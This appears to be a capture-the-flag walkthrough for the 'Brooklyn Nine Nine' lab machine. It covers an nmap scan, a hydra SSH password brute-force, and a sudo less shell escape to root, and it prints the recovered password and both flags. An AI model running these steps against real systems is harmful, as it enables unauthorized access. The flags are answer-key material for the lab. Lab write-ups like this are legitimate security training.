# Brooklyn Nine Nine

### #1 User flag

Run a nmap scan to see how many ports is open.
```
nmap -sV <ip>
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Seach ftp to see if there is anything good there
```
note_to_jake.txt
```

Jake has a bad password so we bruteforce jake
```
hydra -l jake -P rockyou.txt ssh://<ip>
[22][ssh] host: 10.10.10.91   login: jake   password: 987654321
```

Log in and check folders for files
```
cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

### #2 Root flag

List user's privileges
```
sudo -l
sudo less /etc/profile 
!/bin/sh 
```
Finish off with cating out the root flag
```
cat /root/root.txt  
3a9f0ea7bb98050796b649e85481845
```
